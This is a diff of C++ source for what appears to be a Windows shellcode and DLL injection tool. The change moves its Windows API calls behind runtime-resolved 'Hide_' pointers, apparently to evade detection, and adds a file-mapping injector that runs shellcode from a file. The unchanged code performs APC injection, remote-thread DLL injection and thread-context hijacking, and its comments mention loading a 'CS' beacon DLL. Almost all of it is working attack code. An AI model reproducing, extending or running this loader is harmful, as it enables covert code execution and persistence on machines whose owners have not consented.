@@ -1,240 +1,62 @@
 #include<iostream>
 #include<tchar.h>
-#include <cstring>
 #include<Windows.h>
 #include<Tlhelp32.h>
+#include  "def.h"
 using namespace std;
 
-DWORD Hide_ResumeThread(
-	_In_ HANDLE hThread
-)
-{
-typedef DWORD (WINAPI *Fn_ResumeThread)(
-	_In_ HANDLE hThread
-);
-HMODULE ResumeThreadHandle = GetModuleHandleW(L"Kernel32.dll");
-Fn_ResumeThread ptr = (Fn_ResumeThread)GetProcAddress(ResumeThreadHandle, "ResumeThread");
-return ptr(hThread);
-}
-BOOL  Hide_SetThreadContext(
-	_In_ HANDLE hThread,
-	_In_ CONST CONTEXT* lpContext
-)
-{
-typedef	BOOL (WINAPI *Fn_SetThreadContext)(
-			_In_ HANDLE hThread,
-			_In_ CONST CONTEXT * lpContext
-		);
-HMODULE SetThreadContextHandle = GetModuleHandleW(L"Kernel32.dll");
-Fn_SetThreadContext ptr = (Fn_SetThreadContext)GetProcAddress(SetThreadContextHandle, "SetThreadContext");
-return ptr(hThread,lpContext);
-}
-BOOL Hide_GetThreadContext(
-	_In_ HANDLE hThread,
-	_Inout_ LPCONTEXT lpContext
-) 
-{
-typedef	BOOL (WINAPI *Fn_GetThreadContext)(
-			_In_ HANDLE hThread,
-			_Inout_ LPCONTEXT lpContext
-		);
-HMODULE GetThreadContextHandle = GetModuleHandleW(L"Kernel32.dll");
-Fn_GetThreadContext ptr = (Fn_GetThreadContext)GetProcAddress(GetThreadContextHandle, "GetThreadContext");
-return ptr(hThread,lpContext);
-}
-DWORD Hide_SuspendThread(
-	_In_ HANDLE hThread
-)
-{
-	typedef DWORD (WINAPI *Fn_SuspendThread)(
-			_In_ HANDLE hThread
-		);
-	HMODULE suspendHandle = GetModuleHandleW(L"Kernel32.dll");
-	Fn_SuspendThread ptr = (Fn_SuspendThread)GetProcAddress(suspendHandle, "SuspendThread");
-	return ptr(hThread);
-}
+typedef struct Initialization
+{	
+	Fn_CreateFileMappingW		Hide_CreateFileMappingW;
+	Fn_ResumeThread				Hide_ResumeThread;
+	Fn_SetThreadContext         Hide_SetThreadContext;
+	Fn_GetThreadContext			Hide_GetThreadContext;
+	Fn_SuspendThread			Hide_SuspendThread;
+	Fn_CreateToolhelp32Snapshot Hide_CreateToolhelp32Snapshot;
+	Fn_OpenThread				Hide_OpenThread;
+	FN_CreateRemoteThread		Hide_CreateRemoteThread;
+	Fn_ReadFile					Hide_ReadFile;
+	Fn_GetFileSize				Hide_GetFileSize;
+	Fn_CreateFileW				Hide_CreateFileW;
+	Fn_OpenProcess				Hide_OpenProcess;
+	Fn_QueueUserAPC				Hide_QueueUserAPC;
+	Fn_VirtualAllocEx           Hide_VirtualAllocEx;
+	Fn_WriteProcessMemory		Hide_WriteProcessMemory;
+	Fn_MapViewOfFile            Hide_MapViewOfFile;
+	Fn_WaitForSingleObject      Hide_WaitForSingleObject;
+	Fn_CreateThread             Hide_CreateThread;
 
-HANDLE Hide_CreateToolhelp32Snapshot(
-	DWORD dwFlags,
-	DWORD th32ProcessID
-)
+}Initialization;
+
+Initialization func = { 0 };
+
+BOOL Win32()
 {
-	typedef HANDLE (WINAPI *Fn_CreateToolhelp32Snapshot)(
-			DWORD dwFlags,
-			DWORD th32ProcessID
-		);
-	HMODULE CreateToolhelp32SnapshotHandle = GetModuleHandleW(L"Kernel32.dll");
-	Fn_CreateToolhelp32Snapshot ptr = (Fn_CreateToolhelp32Snapshot)GetProcAddress(CreateToolhelp32SnapshotHandle, "CreateToolhelp32Snapshot");
-	return ptr(dwFlags,th32ProcessID);
-}
-HANDLE Hide_OpenThread(
-	_In_ DWORD dwDesiredAccess,
-	_In_ BOOL bInheritHandle,
-	_In_ DWORD dwThreadId
-)
-{
-	typedef	HANDLE(WINAPI* Fn_OpenThread)(
-		_In_ DWORD dwDesiredAccess,
-		_In_ BOOL bInheritHandle,
-		_In_ DWORD dwThreadId
-		);
-	HMODULE OpenThreadHandle = GetModuleHandleW(L"Kernel32.dll");
-	Fn_OpenThread ptr = (Fn_OpenThread)GetProcAddress(OpenThreadHandle, "OpenThread");
-	return ptr(dwDesiredAccess, bInheritHandle, dwThreadId);
-}
-
-HANDLE  Hide_CreateRemoteThread(
-	_In_ HANDLE hProcess,
-	_In_opt_ LPSECURITY_ATTRIBUTES lpThreadAttributes,
-	_In_ SIZE_T dwStackSize,
-	_In_ LPTHREAD_START_ROUTINE lpStartAddress,
-	_In_opt_ LPVOID lpParameter,
-	_In_ DWORD dwCreationFlags,
-	_Out_opt_ LPDWORD lpThreadId
-)
-{
-	typedef	HANDLE(WINAPI* FN_CreateRemoteThread)(
-		_In_ HANDLE hProcess,
-		_In_opt_ LPSECURITY_ATTRIBUTES lpThreadAttributes,
-		_In_ SIZE_T dwStackSize,
-		_In_ LPTHREAD_START_ROUTINE lpStartAddress,
-		_In_opt_ LPVOID lpParameter,
-		_In_ DWORD dwCreationFlags,
-		_Out_opt_ LPDWORD lpThreadId
-		);
-	HMODULE CreateRemoteThreadHandle = GetModuleHandleW(L"Kernel32.dll");
-	FN_CreateRemoteThread ptr = (FN_CreateRemoteThread)GetProcAddress(CreateRemoteThreadHandle, "CreateRemoteThread");
-	return ptr(hProcess, lpThreadAttributes, dwStackSize, lpStartAddress, lpParameter, dwCreationFlags, lpThreadId);
-}
-
- BOOL Hide_ReadFile(
-	_In_ HANDLE hFile,
-	_Out_writes_bytes_to_opt_(nNumberOfBytesToRead, *lpNumberOfBytesRead) __out_data_source(FILE) LPVOID lpBuffer,
-	_In_ DWORD nNumberOfBytesToRead,
-	_Out_opt_ LPDWORD lpNumberOfBytesRead,
-	_Inout_opt_ LPOVERLAPPED lpOverlapped
-	)
- {
-	 typedef BOOL(WINAPI* Fn_ReadFile)(
-		 _In_ HANDLE hFile,
-		 _Out_writes_bytes_to_opt_(nNumberOfBytesToRead, *lpNumberOfBytesRead) __out_data_source(FILE) LPVOID lpBuffer,
-		 _In_ DWORD nNumberOfBytesToRead,
-		 _Out_opt_ LPDWORD lpNumberOfBytesRead,
-		 _Inout_opt_ LPOVERLAPPED lpOverlapped
-		 );
-	 HMODULE ReadFileHandle = GetModuleHandleW(L"Kernel32.dll");
-	 Fn_ReadFile ptr = (Fn_ReadFile)GetProcAddress(ReadFileHandle, "ReadFile");
-	 return ptr(hFile,lpBuffer,nNumberOfBytesToRead,lpNumberOfBytesRead,lpOverlapped);
- }
-
- DWORD Hide_GetFileSize(
-	 _In_ HANDLE hFile,
-	 _Out_opt_ LPDWORD lpFileSizeHigh
-	 )
- {
-	 typedef DWORD(WINAPI* Fn_GetFileSize)(
-		 _In_ HANDLE hFile,
-		 _Out_opt_ LPDWORD lpFileSizeHigh
-		 );
-	 HMODULE ReadFileHandle = GetModuleHandleW(L"Kernel32.dll");
-	 Fn_GetFileSize ptr = (Fn_GetFileSize)GetProcAddress(ReadFileHandle, "GetFileSize");
-	 return ptr(hFile,lpFileSizeHigh);
- }
-
- HANDLE   Hide_CreateFileW(
-	 _In_ LPCWSTR lpFileName,
-	 _In_ DWORD dwDesiredAccess,
-	 _In_ DWORD dwShareMode,
-	 _In_opt_ LPSECURITY_ATTRIBUTES lpSecurityAttributes,
-	 _In_ DWORD dwCreationDisposition,
-	 _In_ DWORD dwFlagsAndAttributes,
-	 _In_opt_ HANDLE hTemplateFile
- )
-
- {
-	 typedef HANDLE(WINAPI* Fn_CreateFileW)(
-		 _In_ LPCWSTR lpFileName,
-		 _In_ DWORD dwDesiredAccess,
-		 _In_ DWORD dwShareMode,
-		 _In_opt_ LPSECURITY_ATTRIBUTES lpSecurityAttributes,
-		 _In_ DWORD dwCreationDisposition,
-		 _In_ DWORD dwFlagsAndAttributes,
-		 _In_opt_ HANDLE hTemplateFile
-		 );
-	 HMODULE CreateFileHandle = GetModuleHandleW(L"Kernel32.dll");
-	 Fn_CreateFileW ptr = (Fn_CreateFileW)GetProcAddress(CreateFileHandle, "CreateFileW");
-	 return ptr(lpFileName,dwDesiredAccess,dwShareMode,lpSecurityAttributes,dwCreationDisposition,dwFlagsAndAttributes,hTemplateFile); 
- }
-
-HANDLE Hide_OpenProcess(
-	_In_ DWORD dwDesiredAccess,
-	_In_ BOOL bInheritHandle,
-	_In_ DWORD dwProcessId
-)
-{
-	typedef HANDLE(WINAPI* Fn_OpenProcess)(
-		_In_ DWORD dwDesiredAccess,
-		_In_ BOOL bInheritHandle,
-		_In_ DWORD dwProcessId
-		);
-	HMODULE OpenProcessHandle = GetModuleHandleW(L"Kernel32.dll");
-	Fn_OpenProcess ptr = (Fn_OpenProcess)GetProcAddress(OpenProcessHandle, "OpenProcess");
-	return ptr(dwDesiredAccess, bInheritHandle, dwProcessId);
-}
-DWORD Hide_QueueUserAPC(
-	_In_ PAPCFUNC pfnAPC,
-	_In_ HANDLE hThread,
-	_In_ ULONG_PTR dwData
-)
-{
-	typedef DWORD(WINAPI* Fn_QueueUserAPC)(
-		_In_ PAPCFUNC pfnAPC,
-		_In_ HANDLE hThread,
-		_In_ ULONG_PTR dwData
-		);
-	HMODULE QueueUserAPCHandle = GetModuleHandleW(L"Kernel32.dll");
-	Fn_QueueUserAPC ptr = (Fn_QueueUserAPC)GetProcAddress(QueueUserAPCHandle, "QueueUserAPC");
-	return ptr(pfnAPC, hThread, dwData);
-
-}
-LPVOID Hide_VirtualAllocEx(
-	_In_ HANDLE hProcess,
-	_In_opt_ LPVOID lpAddress,
-	_In_ SIZE_T dwSize,
-	_In_ DWORD flAllocationType,
-	_In_ DWORD flProtect
-)
-{
-	typedef LPVOID(WINAPI* Fn_VirtualAllocEx)(
-		_In_ HANDLE hProcess,
-		_In_opt_ LPVOID lpAddress,
-		_In_ SIZE_T dwSize,
-		_In_ DWORD flAllocationType,
-		_In_ DWORD flProtect
-		);
-	HMODULE	VirtualAllocExHandle = GetModuleHandleW(L"Kernel32.dll");
-	Fn_VirtualAllocEx ptr = (Fn_VirtualAllocEx)GetProcAddress(VirtualAllocExHandle, "VirtualAllocEx");
-	return ptr(hProcess, lpAddress, dwSize, flAllocationType, flProtect);
-}
-
-BOOL Hide_WriteProcessMemory(
-	_In_ HANDLE hProcess,
-	_In_ LPVOID lpBaseAddress,
-	_In_reads_bytes_(nSize) LPCVOID lpBuffer,
-	_In_ SIZE_T nSize,
-	_Out_opt_ SIZE_T* lpNumberOfBytesWritten
-) {
-	typedef BOOL(*Fn_WriteProcessMemory)(
-		_In_ HANDLE hProcess,
-		_In_ LPVOID lpBaseAddress,
-		_In_reads_bytes_(nSize) LPCVOID lpBuffer,
-		_In_ SIZE_T nSize,
-		_Out_opt_ SIZE_T* lpNumberOfBytesWritten
-		);
-
-	HMODULE	WriteProcessMemoryHandle = GetModuleHandleW(L"KernelBase.dll");
-	Fn_WriteProcessMemory ptr = (Fn_WriteProcessMemory)GetProcAddress(WriteProcessMemoryHandle, "WriteProcessMemory");
-	return ptr(hProcess, lpBaseAddress, lpBuffer, nSize, lpNumberOfBytesWritten);
+	HMODULE hKernel32 = GetModuleHandleW(L"Kernel32.dll");
+	func.Hide_CreateThread				= (Fn_CreateThread)GetProcAddress(hKernel32, "CreateThread");
+	func.Hide_WaitForSingleObject		= (Fn_WaitForSingleObject)GetProcAddress(hKernel32, "WaitForSingleObject");
+	func.Hide_CreateFileMappingW		= (Fn_CreateFileMappingW)GetProcAddress(hKernel32, "CreateFileMappingW");
+	func.Hide_ResumeThread				= (Fn_ResumeThread)GetProcAddress(hKernel32, "ResumeThread");
+	func.Hide_SetThreadContext			= (Fn_SetThreadContext)GetProcAddress(hKernel32, "SetThreadContext");
+	func.Hide_GetThreadContext			= (Fn_GetThreadContext)GetProcAddress(hKernel32, "GetThreadContext");
+	func.Hide_SuspendThread				= (Fn_SuspendThread)GetProcAddress(hKernel32, "SuspendThread");
+	func.Hide_CreateToolhelp32Snapshot  = (Fn_CreateToolhelp32Snapshot)GetProcAddress(hKernel32, "CreateToolhelp32Snapshot");
+	func.Hide_OpenThread				= (Fn_OpenThread)GetProcAddress(hKernel32, "OpenThread");
+	func.Hide_CreateRemoteThread		= (FN_CreateRemoteThread)GetProcAddress(hKernel32, "CreateRemoteThread");
+	func.Hide_ReadFile					= (Fn_ReadFile)GetProcAddress(hKernel32, "ReadFile");
+	func.Hide_GetFileSize				= (Fn_GetFileSize)GetProcAddress(hKernel32, "GetFileSize");
+	func.Hide_CreateFileW				= (Fn_CreateFileW)GetProcAddress(hKernel32, "CreateFileW");
+	func.Hide_OpenProcess				= (Fn_OpenProcess)GetProcAddress(hKernel32, "OpenProcess");
+	func.Hide_QueueUserAPC				= (Fn_QueueUserAPC)GetProcAddress(hKernel32, "QueueUserAPC");
+	func.Hide_VirtualAllocEx			= (Fn_VirtualAllocEx)GetProcAddress(hKernel32, "VirtualAllocEx");
+	func.Hide_WriteProcessMemory		= (Fn_WriteProcessMemory)GetProcAddress(hKernel32, "WriteProcessMemory");
+	func.Hide_MapViewOfFile				= (Fn_MapViewOfFile)GetProcAddress(hKernel32, "MapViewOfFile");
+	if (func.Hide_CreateFileMappingW && func.Hide_CreateFileW && func.Hide_CreateRemoteThread && func.Hide_CreateToolhelp32Snapshot && func.Hide_GetFileSize &&
+		func.Hide_GetThreadContext && func.Hide_OpenProcess && func.Hide_OpenThread && func.Hide_QueueUserAPC && func.Hide_ReadFile && func.Hide_ResumeThread &&
+		func.Hide_SetThreadContext && func.Hide_SuspendThread && func.Hide_VirtualAllocEx && func.Hide_WriteProcessMemory)
+		return TRUE;
+	else
+		return FALSE;
 }
 
 
@@ -259,7 +81,7 @@ DWORD GetProcessPID(LPCTSTR lpProcessName)
 {
 	DWORD Ret = 0;
 	PROCESSENTRY32 p32;
-	HANDLE lpSnapshot = Hide_CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+	HANDLE lpSnapshot = func.Hide_CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
 	if (lpSnapshot == INVALID_HANDLE_VALUE)
 	{
 		return Ret;
@@ -280,7 +102,7 @@ DWORD GetProcessPID(LPCTSTR lpProcessName)
 void APCInject(DWORD pid, LPCWSTR dllpath)
 {
 	//1.获取句柄
-	HANDLE TargetHandle = Hide_OpenProcess(PROCESS_ALL_ACCESS, NULL, pid);
+	HANDLE TargetHandle = func.Hide_OpenProcess(PROCESS_ALL_ACCESS, NULL, pid);
 	if (TargetHandle == NULL)
 	{
 		cout << "	[-] Get TargetProcessHandle Failed :(" << endl;
@@ -299,7 +121,7 @@ void APCInject(DWORD pid, LPCWSTR dllpath)
 
 	//2.远程申请内存
 	DWORD length = (wcslen(dllpath) + 2) * sizeof(TCHAR);
-	PVOID RemoteMemory = Hide_VirtualAllocEx(TargetHandle, NULL, length, MEM_COMMIT, PAGE_EXECUTE_READ);
+	PVOID RemoteMemory = func.Hide_VirtualAllocEx(TargetHandle, NULL, length, MEM_COMMIT, PAGE_EXECUTE_READ);
 	if (RemoteMemory == NULL)
 	{
 		cout << "	[-] VirtualAlloc Address Failed :(" << endl;
@@ -310,7 +132,7 @@ void APCInject(DWORD pid, LPCWSTR dllpath)
 	}
 	//3.将上线的DLL的路径写入内存
 
-	BOOL WriteStatus = Hide_WriteProcessMemory(TargetHandle, RemoteMemory, dllpath, length, NULL);
+	BOOL WriteStatus = func.Hide_WriteProcessMemory(TargetHandle, RemoteMemory, dllpath, length, NULL);
 	if (WriteStatus == 0)
 	{
 		cout << "	[-] Write CS's DLL Into Memory Failed :(" << endl;
@@ -332,7 +154,7 @@ void APCInject(DWORD pid, LPCWSTR dllpath)
 		cout << "	[+] Get LoadLibrary's Address Successfully :)" << endl;
 	}
 	//5.创建线程快照并且插入APC函数
-	HANDLE SnapShot = Hide_CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, NULL);
+	HANDLE SnapShot = func.Hide_CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, NULL);
 	if (SnapShot == INVALID_HANDLE_VALUE)
 	{
 		cout << "	[-] Taking Thread Snap Shot Failed :(" << endl;
@@ -354,10 +176,10 @@ void APCInject(DWORD pid, LPCWSTR dllpath)
 		//判断目标线程的进程ID是否是我们要注入的进程的ID
 		if (te.th32OwnerProcessID == pid)
 		{
-			ThreadHandle = Hide_OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);  //获取目标线程的句柄
+			ThreadHandle = func.Hide_OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);  //获取目标线程的句柄
 			if (ThreadHandle)
 			{
-				DWORD dwRet = Hide_QueueUserAPC((PAPCFUNC)LoadLibraryAddress, ThreadHandle, (ULONG_PTR)RemoteMemory);  //插入APC函数
+				DWORD dwRet = func.Hide_QueueUserAPC((PAPCFUNC)LoadLibraryAddress, ThreadHandle, (ULONG_PTR)RemoteMemory);  //插入APC函数
 				if (dwRet == TRUE)
 				{
 					flag++;
@@ -370,16 +192,16 @@ void APCInject(DWORD pid, LPCWSTR dllpath)
 		{
 			if (te.th32OwnerProcessID == pid)
 			{
-				ThreadHandle = Hide_OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);
+				ThreadHandle = func.Hide_OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);
 				if (ThreadHandle)
 				{
-					DWORD dwRet = Hide_QueueUserAPC((PAPCFUNC)LoadLibraryAddress, ThreadHandle, (ULONG_PTR)RemoteMemory);
+					DWORD dwRet = func.Hide_QueueUserAPC((PAPCFUNC)LoadLibraryAddress, ThreadHandle, (ULONG_PTR)RemoteMemory);
 					if (dwRet == TRUE)
 					{
 						flag++;
 					}
 				}
-				ThreadHandle = NULL;  //清除句柄
+				ThreadHandle = NULL;  
 			}
 		}
 		CloseHandle(TargetHandle);
@@ -402,12 +224,12 @@ void RemoteThreadHiJacking(DWORD targetPID, LPCWSTR binPath)
 	unsigned char* tempbuffer = NULL;
 	DWORD          fileLength = 0;
 	HANDLE         fileHandle = NULL;
-	fileHandle = Hide_CreateFileW(binPath, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
-	
-	fileLength = Hide_GetFileSize(fileHandle, NULL);
-	
+	fileHandle = func.Hide_CreateFileW(binPath, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+
+	fileLength = func.Hide_GetFileSize(fileHandle, NULL);
+
 	tempbuffer = (unsigned char*)malloc(fileLength);
-	Hide_ReadFile(fileHandle, tempbuffer, fileLength, NULL, NULL);
+	func.Hide_ReadFile(fileHandle, tempbuffer, fileLength, NULL, NULL);
 
 	DWORD resumeCount = 0;
 	DWORD suspendCount = 0;
@@ -420,23 +242,23 @@ void RemoteThreadHiJacking(DWORD targetPID, LPCWSTR binPath)
 	ThreadCtx.ContextFlags = CONTEXT_FULL;
 	t32.dwSize = sizeof(THREADENTRY32);
 
-	targetProcessHandle = Hide_OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPID);
-	remoteShellCodeBuffer = (unsigned char*)Hide_VirtualAllocEx(targetProcessHandle, NULL, sizeof(tempbuffer), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
-	
-	Hide_WriteProcessMemory(targetProcessHandle, remoteShellCodeBuffer, tempbuffer, fileLength, NULL);
+	targetProcessHandle = func.Hide_OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPID);
+	remoteShellCodeBuffer = (unsigned char*)func.Hide_VirtualAllocEx(targetProcessHandle, NULL, sizeof(tempbuffer), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
 
-	snapShot = Hide_CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
+	func.Hide_WriteProcessMemory(targetProcessHandle, remoteShellCodeBuffer, tempbuffer, fileLength, NULL);
+
+	snapShot = func.Hide_CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
 	Thread32First(snapShot, &t32);
 
 	while (Thread32Next(snapShot, &t32))
 	{
 		if (t32.th32OwnerProcessID == targetPID)
 		{
-			targetThreadHandle = Hide_OpenThread(THREAD_ALL_ACCESS, FALSE, t32.th32ThreadID);
+			targetThreadHandle = func.Hide_OpenThread(THREAD_ALL_ACCESS, FALSE, t32.th32ThreadID);
 			break;
 		}
 	}
-	Hide_SuspendThread(targetThreadHandle);
+	func.Hide_SuspendThread(targetThreadHandle);
 	if (suspendCount == (DWORD)-1)
 	{
 		cout << "	[-]Suspend Target Thread Failed :(" << endl;
@@ -446,7 +268,7 @@ void RemoteThreadHiJacking(DWORD targetPID, LPCWSTR binPath)
 	{
 		cout << "	[+] Suspend Target Thread Successfully :)" << endl;
 	}
-	if (!Hide_GetThreadContext(targetThreadHandle, &ThreadCtx))
+	if (!func.Hide_GetThreadContext(targetThreadHandle, &ThreadCtx))
 	{
 		cout << "	[-]Get Target Thread Context Failed :(" << endl;
 		goto end;
@@ -456,7 +278,7 @@ void RemoteThreadHiJacking(DWORD targetPID, LPCWSTR binPath)
 		cout << "	[+] Get Target Thread Successfully :)" << endl;
 	}
 	ThreadCtx.Rip = (DWORD_PTR)remoteShellCodeBuffer;
-	if (!Hide_SetThreadContext(targetThreadHandle, &ThreadCtx))
+	if (!func.Hide_SetThreadContext(targetThreadHandle, &ThreadCtx))
 	{
 		cout << "	[-]Set Target Thread Context Failed :(";
 		goto end;
@@ -465,7 +287,7 @@ void RemoteThreadHiJacking(DWORD targetPID, LPCWSTR binPath)
 	{
 		cout << "	[+] Set Target Thread Context Successfully :)" << endl;
 	}
-	resumeCount = Hide_ResumeThread(targetThreadHandle);
+	resumeCount = func.Hide_ResumeThread(targetThreadHandle);
 	if (resumeCount == (DWORD)-1) {
 		cout << "	[-] Resume Target Thread Failed :(" << endl;
 	}
@@ -480,14 +302,14 @@ end:
 	CloseHandle(targetThreadHandle);
 }
 
-void TraverseProcess(LPCWSTR ProcessName)
+BOOL TraverseProcess(LPCWSTR ProcessName)
 {
 	int cnt = 0;
 	HANDLE snapShot;
 	PROCESSENTRY32 p32 = { 0 };
 	p32.dwSize = sizeof(PROCESSENTRY32);
 
-	snapShot = Hide_CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
+	snapShot = func.Hide_CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
 	Process32First(snapShot, &p32);
 
 	cout << "	[+] Below Are The Process PID :) " << endl;
@@ -502,17 +324,84 @@ void TraverseProcess(LPCWSTR ProcessName)
 	if (cnt == 0)
 	{
 		cout << "	[-] Process PID Not Found :(" << endl;
-		return;
+		return FALSE;
 	}
 	cout << "	[+] Which Thread's PID Do You Wanna HiJack :)" << endl;
 	cout << "	[!] This May Cause Process Collapse , Watch Out [!]" << endl;
+
+	return TRUE;
+}
+
+void MappingInject(LPCWSTR assistFile, LPCWSTR binFile)
+{
+	PVOID    fileBuffer = NULL;
+	DWORD    fileSize = 0;
+	PVOID    pMapAddress = NULL;
+	HANDLE   fileHandle = INVALID_HANDLE_VALUE;
+	HANDLE   tempHandle = INVALID_HANDLE_VALUE;
+	HANDLE   mapAddressHandle = INVALID_HANDLE_VALUE;
+	
+
+	
+	fileHandle = func.Hide_CreateFileW(binFile, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+	if (fileHandle == INVALID_HANDLE_VALUE )
+		goto END;
+	fileSize = func.Hide_GetFileSize(fileHandle, NULL);
+	if (fileSize == 0)
+		goto END;
+	fileBuffer = malloc(fileSize);
+	if (fileBuffer == NULL)
+		goto END;
+	if (!func.Hide_ReadFile(fileHandle, fileBuffer, fileSize, NULL, NULL))
+		goto END;
+	cout << "	[+] Read Bin File Into Memory Successfully :)" << endl;
+
+	tempHandle = func.Hide_CreateFileMappingW(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, fileSize, NULL);
+	if (tempHandle == INVALID_HANDLE_VALUE)
+	{
+		cout << "	[-] Create Mapping Object Failed :(" << endl;
+		goto END;
+	}
+	else
+		cout << "	[+] Create Mapping Object Successfully :)" << endl;
+
+	pMapAddress = func.Hide_MapViewOfFile(tempHandle, FILE_MAP_WRITE | FILE_MAP_EXECUTE, 0, 0, fileSize);
+	if (pMapAddress == NULL)
+	{
+		cout << "	[-] Mapping Memory Failed :(" << endl;
+		goto END;
+	}
+	else
+		cout << "	[+] Mapping Memory Successfully :)" << endl;
+
+	memcpy(pMapAddress, fileBuffer, fileSize);
+		
+	mapAddressHandle = func.Hide_CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)pMapAddress, NULL, NULL, NULL);
+	if (mapAddressHandle == INVALID_HANDLE_VALUE)
+	{
+		cout << "	[-] Create Mapping Memory Thread Failed :(" << endl;
+		goto END;
+	}
+	else
+		cout << "	[+] Create Mapping Memory Thread Successfully :)" << endl;
+
+	cout << "	[+] Mapping Inject Successfully !! Enj0y Hacking Time :) !" << endl;
+	func.Hide_WaitForSingleObject(mapAddressHandle, INFINITE);
+	CloseHandle(fileHandle);
+	CloseHandle(tempHandle);
+	CloseHandle(mapAddressHandle);
+	return;
+END:
+	CloseHandle(fileHandle);
+	CloseHandle(tempHandle);
+	CloseHandle(mapAddressHandle);
 }
 
 void DLLInject(DWORD pid, LPCWSTR dllpath)
 {
 	//1.获取句柄
-	
-	HANDLE OriginalProcessHandle = Hide_OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+
+	HANDLE OriginalProcessHandle = func.Hide_OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
 	if (OriginalProcessHandle == NULL)
 	{
 		cout << "	[-] Get TargetProcessHandle Failed :(" << endl;
@@ -532,7 +421,7 @@ void DLLInject(DWORD pid, LPCWSTR dllpath)
 	//2.远程申请内存
 	DWORD  length = (wcslen(dllpath) + 1) * sizeof(TCHAR);
 
-	PVOID  RemoteMemory = Hide_VirtualAllocEx(OriginalProcessHandle, NULL, length, MEM_COMMIT, PAGE_EXECUTE_READ);
+	PVOID  RemoteMemory = func.Hide_VirtualAllocEx(OriginalProcessHandle, NULL, length, MEM_COMMIT, PAGE_EXECUTE_READ);
 
 	if (RemoteMemory == NULL)
 	{
@@ -544,7 +433,7 @@ void DLLInject(DWORD pid, LPCWSTR dllpath)
 		cout << "	[+] VirtualAlloc Address Successfully :)" << endl;
 	}
 	//3.将CS上线的DLL写入内存
-	BOOL WriteStatus = Hide_WriteProcessMemory(OriginalProcessHandle, RemoteMemory, dllpath, length, NULL);
+	BOOL WriteStatus = func.Hide_WriteProcessMemory(OriginalProcessHandle, RemoteMemory, dllpath, length, NULL);
 	if (WriteStatus == 0)
 	{
 		cout << "	[-] Write CS's DLL Into Memory Failed :(" << endl;
@@ -571,19 +460,6 @@ void DLLInject(DWORD pid, LPCWSTR dllpath)
 		SIZE_T StackSize,
 		SIZE_T MaximumStackSize,
 		LPVOID pUnkown);
-#else
-	typedef DWORD(WINAPI* typedef_ZwCreateThreadEx)(
-		PHANDLE ThreadHandle,
-		ACCESS_MASK DesiredAccess,
-		LPVOID ObjectAttributes,
-		HANDLE ProcessHandle,
-		LPTHREAD_START_ROUTINE lpStartAddress,
-		LPVOID lpParameter,
-		BOOL CreateSuspended,
-		DWORD dwStackSize,
-		DWORD dw1,
-		DWORD dw2,
-		LPVOID pUnkown);
 #endif
 	//6.获取NTDLL中ZwCreateThreadEx函数
 	typedef_ZwCreateThreadEx  ZwCreateThreadEx = (typedef_ZwCreateThreadEx)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "ZwCreateThreadEx");
@@ -596,7 +472,7 @@ void DLLInject(DWORD pid, LPCWSTR dllpath)
 		cout << "	[+] Get ZwCreateThreadEx Address Successfully :)" << endl;
 	}
 	//5.创建线程 ring3调用CreateRemoteThread
-	HANDLE RemoteHandle = Hide_CreateRemoteThread(OriginalProcessHandle, NULL, 0, (LPTHREAD_START_ROUTINE)LoadLibraryHandle, RemoteMemory, 0, NULL);
+	HANDLE RemoteHandle = func.Hide_CreateRemoteThread(OriginalProcessHandle, NULL, 0, (LPTHREAD_START_ROUTINE)LoadLibraryHandle, RemoteMemory, 0, NULL);
 	if (RemoteHandle == NULL)
 	{
 		cout << "	[-] Ring3 Thread Inject Failed :(" << endl;
@@ -620,7 +496,7 @@ void DLLInject(DWORD pid, LPCWSTR dllpath)
 		cout << "	[-] Ring0 Thread Inject Failed :(" << endl;
 		return;
 	}
-	WaitForSingleObject(RemoteHandle, -1);
+	func.Hide_WaitForSingleObject(RemoteHandle, -1);
 	//8.释放DLL空间
 	VirtualFreeEx(OriginalProcessHandle, RemoteMemory, length, MEM_COMMIT);
 	//9.关闭句柄
@@ -657,11 +533,9 @@ void Banner(int type)
 
 		SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
 	}
-	else
+	else if (type == 3)
 	{
 		HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
-
-		// 设置控制台文本颜色为红色
 		SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_INTENSITY);
 		std::cout << "                              __________                       __                                                \n"
 			"                              \\______   \\ ____   _____   _____/  |_  ____                                       \n"
@@ -678,6 +552,18 @@ void Banner(int type)
 
 		SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
 	}
+	else if(type == 4)
+	{
+		HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
+		SetConsoleTextAttribute(hConsole, FOREGROUND_BLUE | FOREGROUND_INTENSITY);
+		std::cout << "    _____                       .__                 .___            __               __   \n";
